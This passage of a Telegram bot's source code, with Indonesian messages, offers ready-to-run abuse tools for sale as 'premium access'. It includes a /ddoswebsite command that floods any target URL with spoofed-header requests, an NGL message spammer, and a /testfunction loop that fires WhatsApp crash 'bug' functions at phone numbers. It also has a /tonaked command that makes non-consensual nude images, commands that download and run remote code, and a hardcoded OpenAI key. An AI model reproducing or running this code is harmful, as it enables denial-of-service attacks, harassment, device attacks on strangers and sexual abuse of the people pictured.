    delete require.cache[require.resolve(pathConfigNode)];

    await bot.sendMessage(
      chatId,
      `\`\`\`js\n╭─────────────────\n│   SUKSES ADD PREMIUM   \n│────────────────\n│ ID Grup: ${targetGroupId}\n│ Status: AKTIF (PREMIUM)\n│\n│ Grup berhasil disimpan\n│ otomatis ke config.js\n╰─────────────────\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("Error saat menyimpan grup premium:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan internal saat memproses data grup. Coba lagi.",
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/trackip(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let joined = await checkJoined(userId);

  if (!joined) {
    return sendJoinMessage(chatId);
  }

  const args = msg.text.split(" ").filter(Boolean);
  if (!args[1]) return bot.sendMessage(chatId, "❌ ⵢ Missing Input\nExample: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every((p) => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false;
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex =
      /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return bot.sendMessage(
      chatId,
      "❌ ⵢ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar"
    );
  }

  const processingMsg = await bot.sendMessage(
    chatId,
    `🔎 ⵢ Tracking IP ${ip} — sedang memproses`
  );

  try {
    const res = await axios.get(
      `https://ipwhois.app/json/${encodeURIComponent(ip)}`,
      { timeout: 10000 }
    );
    const data = res.data;

    if (!data || data.success === false) {
      return bot.sendMessage(chatId, `❌ ⵢ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl =
      lat && lon
        ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(
            lat + "," + lon
          )}` : null;

    const caption = `
<blockquote><b>─ ¡ ᬊ X-Vaelix Infinity ¡ ─</b></blockquote>
┃☰. - IP: ${data.ip || "-"}
〢-╰➤ ° ↯ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
┃☰. - Region: ${data.region || "-"}
〢-╰➤ ° ↯ City: ${data.city || "-"}
┃☰. - ZIP: ${data.postal || "-"}
〢-╰➤ ° ↯ Timezone: ${data.timezone_gmt || "-"}
┃☰. - ISP: ${data.isp || "-"}
〢-╰➤ ° ↯ Org: ${data.org || "-"}
┃☰. - ASN: ${data.asn || "-"}
〢-╰➤ ° ↯ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🌍 ⵢ Location", url: mapsUrl }]
        ]
      }
    } : null;

    if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
      await bot.editMessageText(
        processingMsg.chat.id,
        processingMsg.message_id,
        undefined,
        caption,
        { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
      );
    } else if (typeof imageThumbnail !== "undefined" && imageThumbnail) {
      await bot.sendPhoto(chatId, imageThumbnail, {
        caption,
        parse_mode: "HTML",
        ...(inlineKeyboard ? inlineKeyboard : {})
      });
    } else {
      if (inlineKeyboard) {
        await bot.sendMessage(chatId, caption, { parse_mode: "HTML", ...inlineKeyboard });
      } else {
        await bot.sendMessage(chatId, caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti" + err);
  }
});

bot.onText(/^\/update$/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://DarlinNyc" }]
        ]
      }
    });
  }

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ ⵢ Balas ke file .js atau package.json yang ingin diupdate, lalu kirim /update")
  }

  const file = msg.reply_to_message.document
  const fileName = file.file_name

  if (!fileName.endsWith(".js") && fileName !== "package.json") {
    return bot.sendMessage(chatId, "❌ ⵢ File harus berekstensi .js atau bernama package.json")
  }

  try {
    const fileLink = await bot.getFileLink(file.file_id)
    const filePath = path.join(__dirname, fileName)

    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath)
      bot.sendMessage(chatId, `🗑️ ⵢ Old Files *${fileName}* Delete.`, { parse_mode: "Markdown" })
    }

    const fileStream = fs.createWriteStream(filePath)
    https.get(fileLink, (response) => {
      response.pipe(fileStream)
      fileStream.on("finish", () => {
        fileStream.close()
        bot.sendMessage(chatId, `✅ ⵢ File *${fileName}* Updated !`, { parse_mode: "Markdown" })
        if (fileName === "index.js" || fileName === "package.json") {
          bot.sendMessage(chatId, `♻️ ⵢ File penting diperbarui (${fileName}) — Bot akan restart...`, { parse_mode: "Markdown" })
          setTimeout(() => {
            exec("pm2 restart all || npm restart || node index.js", (err) => {
              if (err) console.error("Gagal restart bot:", err.message)
            })
          }, 2000)
        }
      })
    }).on("error", (err) => {
      bot.sendMessage(chatId, `❌ ⵢ Gagal mengunduh file: ${err.message}`)
    })
  } catch (err) {
    bot.sendMessage(chatId, `❌ ⵢ Terjadi kesalahan: ${err.message}`)
  }
})

bot.onText(/^\/ddoswebsite(?:\s+(.+))?$/i, async (msg, match) => {
  try {
  const args = (msg.text || "").split(" ").slice(1).join(" ").trim();
    if (!args) {
      return bot.sendMessage(msg.chat.id, "❌ ⵢ Format: /ddoswebsite https://target.com 1000");
    }

    const [target_url, rawThreads] = args.split(" ");
    const threads = parseInt(rawThreads) || 50;

    const processMsg = await bot.sendMessage(msg.chat.id, `<blockquote><b>─ ¡ ᬊ X-Vaelix Infinity ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${threads}
┃☰. - Status
〢-╰➤ ° ↯  Process
`, { parse_mode: "HTML" });

    const attackConfig = {
      threads: threads,
      duration: 60000,
      requestsPerThread: 1000,
      userAgents: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
      ],
      methods: ["GET", "POST", "HEAD", "OPTIONS"]
    };

    let totalRequests = 0;
    let successfulAttacks = 0;
    const startTime = Date.now();

    const attackPromises = [];

    for (let i = 0; i < attackConfig.threads; i++) {
      attackPromises.push(new Promise(async (resolve) => {
        let threadRequests = 0;
        
        while (Date.now() - startTime < attackConfig.duration && threadRequests < attackConfig.requestsPerThread) {
          try {
            const method = attackConfig.methods[Math.floor(Math.random() * attackConfig.methods.length)];
            const userAgent = attackConfig.userAgents[Math.floor(Math.random() * attackConfig.userAgents.length)];
            const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

            const headers = {
              "X-Forwarded-For": ip,
              "X-Real-IP": ip,
              "User-Agent": userAgent,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Connection": "keep-alive",
              "Upgrade-Insecure-Requests": "1",
              "Cache-Control": "no-cache",
              "Pragma": "no-cache"
            };

            const randomPaths = ["/", "/admin", "/wp-admin", "/api", "/test", "/debug"];
            const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
            const attackUrl = target_url + randomPath;

            const response = await axios({
              method: method,
              url: attackUrl,
              headers: headers,
              timeout: 5000,
              validateStatus: () => true
            });

            totalRequests++;
            threadRequests++;
            
            if (response.status < 500) {
              successfulAttacks++;
            }

            if (totalRequests % 100 === 0) {
              const elapsed = Math.floor((Date.now() - startTime) / 1000);
              await bot.editMessageText(
                `<blockquote><b>─ ¡ ᬊ X-Vaelix Infinity ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${attackConfig.threads}
┃☰. - Requests
〢-╰➤ ° ↯  ${totalRequests}
┃☰. - Success
〢-╰➤ ° ↯  ${successfulAttacks}
┃☰. - Duration
〢-╰➤ ° ↯  ${elapsed}s
┃☰. - Status
〢-╰➤ ° ↯  Running
`,
                {
                  chat_id: msg.chat.id,
                  message_id: processMsg.message_id,
                  parse_mode: "HTML"
                }
              );
            }

            await new Promise(r => setTimeout(r, Math.random() * 100));

          } catch (error) {
            threadRequests++;
            totalRequests++;
          }
        }
        resolve();
      }));
    }

    await Promise.all(attackPromises);

    const endTime = Date.now();
    const totalDuration = Math.floor((endTime - startTime) / 1000);

    await bot.editMessageText(
      `<blockquote><b>─ ¡ ᬊ X-Vaelix Infinity ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${attackConfig.threads}
┃☰. - Total Requests
〢-╰➤ ° ↯  ${totalRequests}
┃☰. - Successful
〢-╰➤ ° ↯  ${successfulAttacks}
┃☰. - Total Duration
〢-╰➤ ° ↯  ${totalDuration}s
┃☰. - Requests/Sec
〢-╰➤ ° ↯  ${Math.floor(totalRequests / totalDuration)}
┃☰. - Status
〢-╰➤ ° ↯  Completed
`,
      {
        chat_id: msg.chat.id,
        message_id: processMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, "❌ ⵢ Gagal melakukan serangan ddos" + error);
  }
});

bot.onText(/^\/broadcast(?:\s+([\s\S]+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const text = match[1];

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://DarlinNyc" }]
        ]
      }
    });
  }

  if (!text) {
    return bot.sendMessage(chatId, "Gunakan format:\n`/broadcast <pesan>`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, `Mengirim Pesan ke ${users.size} pengguna...`, { parse_mode: "Markdown" });

  let success = 0;
  let fail = 0;

  for (const userId of users) {
    try {
      await bot.sendMessage(userId, `
<blockquote>Broadcast From Admin [ 𖥊 ]</blockquote>
#- Message : ${text}`, { parse_mode: "HTML" });
      success++;
    } catch {
      fail++;
    }
  }

  await bot.sendMessage(chatId, `Pesan selesai!\n\nTerkirim: ${success}\nGagal: ${fail}`);
});
bot.onText(/^\/chatowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];

  let joined = await checkJoined(userId);

  if (!joined) {
    return sendJoinMessage(chatId);
  }

  bot.sendMessage(OWNER_ID, "From User:\n" + text);
  bot.sendMessage(chatId, "Succes Chat Owner !.");
});
async function getFileBuffer(fileId, bot) {
  const link = await bot.getFileLink(fileId)
  const res = await axios.get(link, { responseType: "arraybuffer" })
  return Buffer.from(res.data)
}

async function getFileUrl(fileId) {
  const file = await bot.getFile(fileId)
  return `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`
}

async function downloadToFile(fileUrl, outPath) {
  const res = await axios.get(fileUrl, { responseType: "stream", timeout: 120000 })
  await streamPipeline(res.data, fs.createWriteStream(outPath))
  return outPath
}

async function downloadBuffer(fileUrl) {
  const res = await axios.get(fileUrl, { responseType: "arraybuffer", timeout: 120000 })
  return Buffer.from(res.data)
}

function tmpPath(ext = "") {
  return path.join(process.cwd(), "tmp_" + uuidv4() + (ext ? ("." + ext) : ""))
}

async function getMediaFromMessage(msg) {
  if (msg.photo) {
    const p = msg.photo[msg.photo.length - 1]
    return { type: "photo", fileId: p.file_id }
  }
  if (msg.video) {
    return { type: "video", fileId: msg.video.file_id }
  }
  if (msg.document && msg.document.mime_type && msg.document.mime_type.startsWith("image")) {
    return { type: "document", fileId: msg.document.file_id }
  }
  if (msg.reply_to_message) {
    const rm = msg.reply_to_message
    if (rm.photo) {
      const p = rm.photo[rm.photo.length - 1]
      return { type: "photo", fileId: p.file_id }
    }
    if (rm.video) {
      return { type: "video", fileId: rm.video.file_id }
    }
    if (rm.document && rm.document.mime_type && rm.document.mime_type.startsWith("image")) {
      return { type: "document", fileId: rm.document.file_id }
    }
  }
  return null
}

async function upscaleSharp(buffer, scale = 2) {
  const img = sharp(buffer)
  const meta = await img.metadata()
  const width = meta.width ? Math.round(meta.width * scale) : null
  if (!width) return null
  const out = await img.resize({ width, withoutEnlargement: false, kernel: sharp.kernel.lanczos3 }).toBuffer()
  return out
}

async function makeSticker(buffer) {
  const out = await sharp(buffer).resize(512, 512, { fit: "cover" }).webp().toBuffer()
  return out
}

async function addWatermark(buffer, text) {
  const meta = await sharp(buffer).metadata()
  const svg = `<svg width="${meta.width}" height="${meta.height}"><style>.a{fill:white;font-size:48px;font-weight:700;stroke:black;stroke-width:2px;}</style><text x="${Math.max(10, Math.floor(meta.width*0.02))}" y="${meta.height - Math.max(10, Math.floor(meta.height*0.02))}" class="a">${text}</text></svg>`
  const out = await sharp(buffer).composite([{ input: Buffer.from(svg), gravity: "southeast" }]).toBuffer()
  return out
}

function downloadFile(url, outputPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outputPath)
    https.get(url, (res) => {
      res.pipe(file)
      file.on("finish", () => file.close(() => resolve(true)))
    }).on("error", (err) => {
      fs.unlinkSync(outputPath)
      reject(err)
    })
  })
}

bot.on("message", async msg => {
  try {
    const chatId = msg.chat.id
    const textRaw = (msg.text || msg.caption || "").trim()
    if (!textRaw) return
    const parts = textRaw.split(" ")
    const cmd = parts[0].toLowerCase()
    const arg = parts.slice(1).join(" ").trim()
    const media = await getMediaFromMessage(msg)
    
   if (msg.text === "/removebg") {
    return bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media Dengan Caption /removebg")
  }

  if (msg.photo) {
    try {
      const fileId = msg.photo[msg.photo.length - 1].file_id
      const file = await bot.getFile(fileId)

      const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`
      const inputPath = "input_removebg.png"
      const outputPath = "removebg_result.png"

      await downloadFile(fileUrl, inputPath)

      await sharp(inputPath)
        .removeAlpha()
        .threshold(200)
        .png()
        .toFile(outputPath)

      await bot.sendPhoto(chatId, outputPath, {
        caption: "✅ ⵢ Remove Bg By X-Vaelix Infinity ( 🍁 )"
      })

      fs.unlinkSync(inputPath)
      fs.unlinkSync(outputPath)

    } catch(e) {
      bot.sendMessage(chatId, "❌ ⵢ Terjadi error saat memproses foto." + e)
    }
  }
    if (cmd === "/sticker" || cmd === "/stiker") {
      if (!media) {
        await bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media / Kirim Media Dengan Caption /sticker")
        return
      }
      const fileUrl = await getFileUrl(media.fileId)
      const buf = await downloadBuffer(fileUrl)
      const webp = await makeSticker(buf)
      await bot.sendSticker(chatId, webp)
      return
    }
    if (cmd === "/watermark" || cmd === "/wm") {
      if (!arg) {
        await bot.sendMessage(chatId, "Tambahkan teks watermark setelah perintah, contoh: /watermark zellx")
        return
      }
      if (!media) {
        await bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media / Kirim Media Dengan Caption /watermark teks")
        return
      }
      const fileUrl = await getFileUrl(media.fileId)
      const buf = await downloadBuffer(fileUrl)
      const out = await addWatermark(buf, arg)
      await bot.sendPhoto(chatId, out)
      return
    }
  } catch (e) {
    try { await bot.sendMessage(msg.chat.id, "Terjadi kesalahan saat memproses") } catch {}
  }
})

const MAIN_FILE = "./index.js";

bot.onText(/^\/addfiture$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const messageId = msg.message_id;
  
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://DarlinNyc" }]
        ]
      }
    });
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ ⵢ Reply ke case text atau file .js yang ingin ditambahkan.");
  }

  let newCase = "";

  if (msg.reply_to_message.text) {
    newCase = msg.reply_to_message.text;
  }

  if (msg.reply_to_message.document) {
    const file = await bot.getFile(msg.reply_to_message.document.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
    const res = await fetch(fileUrl);
    newCase = await res.text();
  }

  if (!newCase) {
    return bot.sendMessage(chatId, "❌ ⵢ Gagal mendapatkan case dari reply.");
  }

  try {
    const appendText = `\n\n${newCase}\n`;
    fs.appendFileSync(MAIN_FILE, appendText, "utf8");

    await bot.sendMessage(chatId, "✅ ⵢ Case berhasil ditambahkan ke index.js!\nPlease Type /restart.", {
      reply_to_message_id: messageId
    });

  } catch (err) {
    bot.sendMessage(chatId, "⚠️ ⵢ Terjadi kesalahan: " + err.message);
  }
});

bot.onText(/^\/spamngl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const args = match[1] ? match[1].split(" ") : [];

  try {
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://DarlinNyc" }]
        ]
      }
    });
  }
  
    if (args.length < 1) {
      return bot.sendMessage(chatId, "❌ ⵢ Format: /spamngl DarlinNyc 10");
    }

    const username = args[0];
    const amount = parseInt(args[1], 10);
    const delay = 200;

    if (isNaN(amount) || amount < 1) {
      return bot.sendMessage(chatId, "❌ ⵢ Masukkan jumlah dan harus berupa angka!");
    }

    await bot.sendMessage(chatId, `⏳ Mengirim ${amount} pesan spam ke ${username}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex");
        const message = "Who's mbape??";
        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;

        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          },
          body,
        });
      } catch (err) {
        console.error(`Error kirim ke-${i}:`, err.message);
      }

      if (i < amount) {
        if (i % 50 === 0) {
          await new Promise((r) => setTimeout(r, delay + 200));
        } else {
          await new Promise((r) => setTimeout(r, delay));
        }
      }
    }

    bot.sendMessage(chatId, `✅ ⵢ Selesai mengirim ${amount} pesan spam ke ${username}`);
  } catch (error) {
    console.error("Error utama:", error);
    bot.sendMessage(chatId, "❌ ⵢ Gagal menghubungi API, coba lagi nanti.");
  }
});

bot.onText(/^\/tonaked(?:\s+(.+))?/,  async (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1];
    let imageUrl = args || null;

    if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
      const fileId = msg.reply_to_message.photo.pop().file_id;
      const fileLink = await bot.getFileLink(fileId);
      imageUrl = fileLink;
    }

    if (!imageUrl) {
      return bot.sendMessage(chatId, "❌  Missing Input\nExample: /tonaked (reply gambar)");
    }

    const statusMsg = await bot.sendMessage(chatId, "⏳ Memproses gambar");

    try {
      const res = await fetch(
        `https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`
      );
      const data = await res.json();
      const hasil = data.result;

      if (!hasil) {
        return bot.editMessageText(
          "❌ ⵢ Gagal memproses gambar, pastikan URL atau foto valid",
          { chat_id: chatId, message_id: statusMsg.message_id }
        );
      }

      await bot.deleteMessage(chatId, statusMsg.message_id);
      await bot.sendPhoto(chatId, hasil);
    } catch (e) {
      await bot.editMessageText("❌ ⵢ Terjadi kesalahan saat memproses gambar", {
        chat_id: chatId,
        message_id: statusMsg.message_id,
      });
    }
  });

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
bot.onText(/^\/testfunction(?:\s+(.+))?/, async (msg, match) => {
  if (!premiumUsers.some(user => user.id === msg.chat.id && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(msg.chat.id, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://DarlinNyc" }]
        ]
      }
    });
  }
  
    try {
      const chatId = msg.chat.id;
      const args = msg.text.split(" ");
      if (args.length < 3)
        return bot.sendMessage(chatId, "❌ ⵢ Format :  /testfunction 62××× 10 (reply function)");

      const q = args[1];
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
      if (isNaN(jumlah) || jumlah <= 0)
        return bot.sendMessage(chatId, "❌ ⵢ Jumlah harus angka");

      if (!msg.reply_to_message || !msg.reply_to_message.text)
        return bot.sendMessage(chatId, "❌ ⵢ Reply dengan function");
        
      const processMsg = await bot.sendPhoto(chatId, imageThumbnail, {
        caption: `<blockquote><b>¡ ᬊ X-Vaelix Infinity ¡</b></blockquote>
⚚. ターゲット : ${q}
⚚. タイプ バグ : Uknown Function 
⚚. バグステータス : Proccesing`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
          ],
        },
      });

      const safeSock = createSafeSock(sock)
      const funcCode = msg.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return bot.sendMessage("❌ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><b>¡ ᬊ X-Vaelix Infinity ¡</b></blockquote>
⚚. ターゲット : ${q}
⚚. タイプ バグ : Uknown Function 
⚚. バグステータス : Succes`;

      try {
        await bot.editMessageCaption(finalText, {
          chat_id: chatId,
          message_id: processMsg.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
            ],
          },
        });
      } catch (e) {
        await bot.sendPhoto(chatId, imageThumbnail, {
          caption: finalText,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
            ],
          },
        });
      }
    } catch (err) {
      console.log(err);
    }
  });

const openaiKey = "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";
const openai = new OpenAI({ apiKey: openaiKey });
bot.onText(/^\/fixcode(.*)/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userExplanation = match[1]?.trim() || "(no explanation provided)";

    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId,
        "❌ ⵢ Format : Reply Code With Command /fixcode"
      );
    }

    let code = "";
    let filename = "fixed.js";
    let lang = "JavaScript";

    const reply = msg.reply_to_message;

    if (reply.document) {
      const fileId = reply.document.file_id;
      const file = await bot.getFile(fileId);
      const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
      const response = await axios.get(fileLink);
      code = response.data;
      filename = reply.document.file_name || "fixed.js";

      if (filename.endsWith(".php")) lang = "PHP";
      else if (filename.endsWith(".py")) lang = "Python";
      else if (filename.endsWith(".html") || filename.endsWith(".htm")) lang = "HTML";
      else if (filename.endsWith(".css")) lang = "CSS";
      else if (filename.endsWith(".json")) lang = "JSON";
      else lang = "JavaScript";

    } else if (reply.text) {
      code = reply.text;
    } else {
      return bot.sendMessage(chatId, "❌ ⵢ Balas ke pesan teks atau file kode.");
    }

    await bot.sendMessage(chatId, "🛠️ ⵢ Process Check & Fix Code");

    const completion = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "system",
          content:
            "Kamu hanya boleh memperbaiki error dalam kode dan merapikan format. " +
            "Berikan penjelasan error dan solusi, lalu tampilkan kode hasil perbaikan tanpa code block. " +
            "Format: ANALYSIS:[penjelasan] CODE:[kode hasil]"
        },
        {
          role: "user",
          content:
            userExplanation === "(no explanation provided)"
              ? `Perbaiki error dan rapikan format kode ${lang} ini:\n${code}`
              : `Perbaiki error dan rapikan format kode ${lang} ini berdasarkan penjelasan:\n${code}\n\nPenjelasan:\n${userExplanation}`
        }
      ]
    });

    const result = completion.choices[0].message.content;

    const analysisMatch = result.match(/ANALYSIS:\s*([\s\S]*?)(?=CODE:|$)/i);
    const codeMatch = result.match(/CODE:\s*([\s\S]*?)$/i);
    const explanation = analysisMatch ? analysisMatch[1].trim() : "Tidak ada analisis spesifik.";
    const fixedCode = codeMatch ? codeMatch[1].trim() : result.trim();

    const header = `
<pre>¡ ᬊ X-Vaelix Infinity ¡ᐧ</pre>
<b>( 🛠️ ) Code Fix Result</b>
<b>Language:</b> ${lang}
<b>User Explanation:</b> ${userExplanation}
<b>Error Analysis:</b>
${explanation}

<b>© ⚊ DarlinNyc  - ¿?</b>
`;

    await bot.sendMessage(chatId, header, { parse_mode: "HTML" });

    const tempDir = "./temp";
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    const tempFilePath = `./temp/fixed_${Date.now()}_${filename}`;
    fs.writeFileSync(tempFilePath, fixedCode);

    await bot.sendDocument(chatId, tempFilePath, {}, {
      filename: `Fixed_${filename}`
    });

    fs.unlinkSync(tempFilePath);

    console.log(chalk.green(`✅ ⵢ Code fix completed for user ${senderId}`));

  } catch (error) {
    console.error(chalk.red(`❌ ⵢ Fixcode error: ${error.message}`));
    await bot.sendMessage(msg.chat.id,
      `❌ ⵢ Failed to fix code: ${error.message}\n\nPlease try again or contact support.`
    );
  }
});

bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];

  let joined = await checkJoined(userId);

  if (!joined) {
    return sendJoinMessage(chatId);
  }

  if (!text) return bot.sendMessage(chatId, "❌ ⵢ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;
    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await bot.sendSticker(chatId, res.data, { filename: "sticker.webp" });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    bot.sendMessage(chatId, "❌ ⵢ Gagal membuat stiker brat.");
  }
});
const iqcSessions = {};
bot.onText(/^\/ssiphone(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const args = msg.text.split(" ").slice(1);
    if (args.length < 3) {
      return bot.sendMessage(
        chatId,
        "❌ ⵢ Format : `/ssiphone 12:00 100 Your Message`",
        { parse_mode: "Markdown" }
      );
    }

    const time = args[0];
